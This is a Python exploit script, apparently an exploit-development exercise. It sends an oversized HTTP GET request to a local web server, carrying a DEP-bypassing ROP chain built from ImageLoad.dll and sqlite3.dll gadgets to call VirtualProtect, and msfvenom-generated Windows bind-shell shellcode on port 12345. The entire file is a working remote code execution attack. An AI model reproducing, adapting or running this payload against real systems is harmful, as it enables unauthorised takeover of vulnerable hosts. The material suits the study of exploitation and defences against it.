import socket
import os
import sys
import struct

ip = "127.0.0.1"
port = 80

#\x00\x0a\x0d\x20\x25\x2f\x5c

#virtual protect 61C832D0
#PUSHAD
#GOALS - VirtualProtect
#EAX 90909090 => Nop   -V                                            
#ECX <writeable pointer> => lpflOldProtect - 61c804f0  - V                            
#EDX 00000040 => flNewProtect     - V                               
#EBX 00000201 => dwSize   512   - V                                   
#ESP ???????? => Leave as is                                 
#EBP ???????? => Call to ESP (jmp, call, push,..) -> !py mona jmp -r esp -cpb '\x00\x0a\x0d\x20\x25\x2f\x5c'              
#ESI ???????? => PTR to VirtualProtect - DWORD PTR of VirtualProtect 
#EDI RETN => ROP-Nop same as EIP  --> !py mona find -type instr -s "retn" -m modulo.dll -cpb "\x00"

CRASH_LEN = 5000  # change me
OFFSET = 4061  # change me

rop_nop = struct.pack("<I",0x61c0104d) # RETN

# bind shell
# msfvenom -p windows/shell_bind_tcp LPORT=12345 -f python -v shellcode -b '\x00\x20\x25\x2b\x2f\x5c' EXITFUNC=thread
shellcode =  b""
shellcode += b"\xbf\x6a\xcb\x4f\xbe\xdd\xc2\xd9\x74\x24\xf4"
shellcode += b"\x5b\x31\xc9\xb1\x53\x31\x7b\x12\x03\x7b\x12"
shellcode += b"\x83\xa9\xcf\xad\x4b\xd1\x38\xb3\xb4\x29\xb9"
shellcode += b"\xd4\x3d\xcc\x88\xd4\x5a\x85\xbb\xe4\x29\xcb"
shellcode += b"\x37\x8e\x7c\xff\xcc\xe2\xa8\xf0\x65\x48\x8f"
shellcode += b"\x3f\x75\xe1\xf3\x5e\xf5\xf8\x27\x80\xc4\x32"
shellcode += b"\x3a\xc1\x01\x2e\xb7\x93\xda\x24\x6a\x03\x6e"
shellcode += b"\x70\xb7\xa8\x3c\x94\xbf\x4d\xf4\x97\xee\xc0"
shellcode += b"\x8e\xc1\x30\xe3\x43\x7a\x79\xfb\x80\x47\x33"
shellcode += b"\x70\x72\x33\xc2\x50\x4a\xbc\x69\x9d\x62\x4f"
shellcode += b"\x73\xda\x45\xb0\x06\x12\xb6\x4d\x11\xe1\xc4"
shellcode += b"\x89\x94\xf1\x6f\x59\x0e\xdd\x8e\x8e\xc9\x96"
shellcode += b"\x9d\x7b\x9d\xf0\x81\x7a\x72\x8b\xbe\xf7\x75"
shellcode += b"\x5b\x37\x43\x52\x7f\x13\x17\xfb\x26\xf9\xf6"
shellcode += b"\x04\x38\xa2\xa7\xa0\x33\x4f\xb3\xd8\x1e\x18"
shellcode += b"\x70\xd1\xa0\xd8\x1e\x62\xd3\xea\x81\xd8\x7b"
shellcode += b"\x47\x49\xc7\x7c\xa8\x60\xbf\x12\x57\x8b\xc0"
shellcode += b"\x3b\x9c\xdf\x90\x53\x35\x60\x7b\xa3\xba\xb5"
shellcode += b"\x16\xab\x1d\x66\x05\x56\xdd\xd6\x89\xf8\xb6"
shellcode += b"\x3c\x06\x27\xa6\x3e\xcc\x40\x4f\xc3\xef\x5e"
shellcode += b"\xa9\x4a\x09\xf4\xd9\x1a\x81\x60\x18\x79\x1a"
shellcode += b"\x17\x63\xab\x32\xbf\x2c\xbd\x85\xc0\xac\xeb"
shellcode += b"\xa1\x56\x27\xf8\x75\x47\x38\xd5\xdd\x10\xaf"
shellcode += b"\xa3\x8f\x53\x51\xb3\x85\x03\xf2\x26\x42\xd3"
shellcode += b"\x7d\x5b\xdd\x84\x2a\xad\x14\x40\xc7\x94\x8e"
shellcode += b"\x76\x1a\x40\xe8\x32\xc1\xb1\xf7\xbb\x84\x8e"
shellcode += b"\xd3\xab\x50\x0e\x58\x9f\x0c\x59\x36\x49\xeb"
shellcode += b"\x33\xf8\x23\xa5\xe8\x52\xa3\x30\xc3\x64\xb5"
shellcode += b"\x3c\x0e\x13\x59\x8c\xe7\x62\x66\x21\x60\x63"
shellcode += b"\x1f\x5f\x10\x8c\xca\xdb\x30\x6f\xde\x11\xd9"
shellcode += b"\x36\x8b\x9b\x84\xc8\x66\xdf\xb0\x4a\x82\xa0"
shellcode += b"\x46\x52\xe7\xa5\x03\xd4\x14\xd4\x1c\xb1\x1a"
shellcode += b"\x4b\x1c\x90"


#EAX - V
eax = struct.pack("<I",0x10015442)  # POP EAX # RETN    ** [ImageLoad.dll] ** 
eax += struct.pack("<I",0x90909090)  # 90909090

#ECX - V
ecx = struct.pack("<I",0x10010102)  # POP ECX # RETN    ** [ImageLoad.dll] ** 
ecx += struct.pack("<I",0x61c804f0)  # RW from sqlite3 

#EDX - V
edx = struct.pack("<I",0x10022c4c) # XOR EDX,EDX # RETN    ** [ImageLoad.dll] **  
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 
edx += struct.pack("<I",0x61c031cc)  # INC EDX # OR CL,CL # RETN 

#EBX - 201 - ricorda di fillare esp+0c con 0x61C832D0 - V
ebx = struct.pack("<I",0x10015442)  # POP EAX # RETN    ** [ImageLoad.dll] ** 
ebx += struct.pack("<I",0xfffffdff) # -201
ebx += struct.pack("<I",0x100231d1)  # NEG EAX # RETN    ** [ImageLoad.dll] **  
ebx += struct.pack("<I",0x1001da09)  # ADD EBX,EAX # MOV EAX,DWORD PTR [ESP+0CH] # INC DWORD PTR [EAX] # RETN    ** [ImageLoad.dll] **
ebx += rop_nop  # patching INC DWORD PTR [EAX]
ebx += rop_nop  # patching INC DWORD PTR [EAX]
ebx += struct.pack("<I",0x10015442)  # pop eax - patching INC DWORD PTR [EAX]
ebx += struct.pack("<I",0x61C832D0)  # virtualprotect - patching INC DWORD PTR [EAX]

#EBP call to esp - V
ebp = struct.pack("<I",0x1001bab0)  # POP EBP # RETN    ** [ImageLoad.dll] **   |
ebp += struct.pack("<I",0x61c227fa) # push esp

#ESI - poi virtualprotect - V
esi = struct.pack("<I",0x10015442)  # POP EAX # RETN    ** [ImageLoad.dll] ** 
esi += struct.pack("<I",0x61C832D0)  # poi virtual protect
esi += struct.pack("<I",0x1002248c)  # MOV EAX,DWORD PTR [EAX] # RETN    ** 
esi += struct.pack("<I",0x61c0a798)  # XCHG EAX,EDI # RETN    ** [sqlite3.dll] ** 
esi += struct.pack("<I",0x1001d626)  # XOR ESI,ESI # RETN    ** [ImageLoad.dll] ** 
esi += struct.pack("<I",0x10021a3e)  # ADD ESI,EDI # RETN 0x00    ** [ImageLoad.dll] **

#EDI - rop nop - V
edi = struct.pack("<I",0x100161e6)  # POP EDI # RETN    ** [ImageLoad.dll] **
edi += rop_nop

pushad = struct.pack("<I",0x100240c2)  # PUSHAD # RETN    ** [ImageLoad.dll] **

nops = b"\x90" * 20

payload = b"A" * 2509
payload += esi
payload += ebx
payload += edi
payload += ebp
payload += edx
payload += ecx
payload += eax
payload += pushad
payload += nops
payload += shellcode
payload += nops

print(OFFSET - len(payload) + 4)
payload += b"A" * (OFFSET - len(payload) + 4)
payload += struct.pack("<I",0x10022877)   # ADD ESP,1004 # RETN
payload += b"\x90" * 10
payload += b"B" * (CRASH_LEN - len(payload))


buffer = b"GET "
buffer += payload
buffer += b" HTTP/1.1\r\n"

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((ip, port))
expl.send(buffer)
expl.close()
